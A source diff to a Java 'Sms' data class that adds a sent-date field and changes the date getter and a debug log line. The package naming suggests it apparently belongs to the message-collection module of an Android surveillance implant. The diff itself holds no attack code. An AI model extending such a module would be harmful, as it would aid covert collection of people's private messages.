@@ -12,6 +12,8 @@ package com.android.dvci.module.message;
 import com.android.dvci.auto.Cfg;
 import com.android.dvci.util.Check;
 
+import java.util.Date;
+
 public class Sms {
 	private static final String TAG = "Sms"; //$NON-NLS-1$
 
@@ -36,6 +38,7 @@ public class Sms {
 	private String reply_path;
 
 	private int id;
+	private long date_sent = 0;
 
 	public Sms(int id, String address, String body, long date, boolean sent) {
 		if (Cfg.DEBUG) {
@@ -65,7 +68,7 @@ public class Sms {
 			Check.log(TAG + " (print): Body: " + body); //$NON-NLS-1$
 		}
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (print): Date: " + date); //$NON-NLS-1$
+			Check.log(TAG + " (print): Date: " + new Date(getDate())); //$NON-NLS-1$
 		}
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (print): Sent: " + sent); //$NON-NLS-1$
@@ -119,8 +122,15 @@ public class Sms {
 		this.date = date;
 	}
 
+	public void setDateSent(long date_sent) {
+		this.date_sent = date_sent;
+	}
+
 	public long getDate() {
-		return date;
+		if(date_sent > 0)
+			return date_sent;
+		else
+			return date;
 	}
 
 	public boolean getSent() {
@@ -203,4 +213,5 @@ public class Sms {
 		
 		return id >= 0;
 	}
+
 }
